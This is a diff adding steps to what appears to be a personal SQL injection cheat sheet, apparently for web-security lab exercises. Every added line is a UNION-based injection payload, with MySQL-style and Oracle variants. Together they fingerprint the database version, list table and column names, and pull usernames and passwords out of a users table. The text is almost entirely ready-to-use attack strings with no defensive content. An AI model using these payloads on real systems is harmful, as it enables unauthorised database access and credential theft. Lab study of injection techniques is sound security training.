@@ -16,7 +16,23 @@
 ' UNION SELECT 'a','a','a'--
 
 
+3.type of database
+'+UNION+SELECT+@@version,+NULL#
+oracle:'+UNION+SELECT+'abc','def'+FROM+dual--
 
+4.get table names
+'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--  
+orace:'+UNION+SELECT+table_name,NULL+FROM+all_tables--
+
+5. get coloumn names
+
+'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--
+oracle:'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--
+
+6. get user data
+
+'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--
+oracle:'+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--
 
 Examples:
 ' UNION SELECT username || '~' || password FROM users--
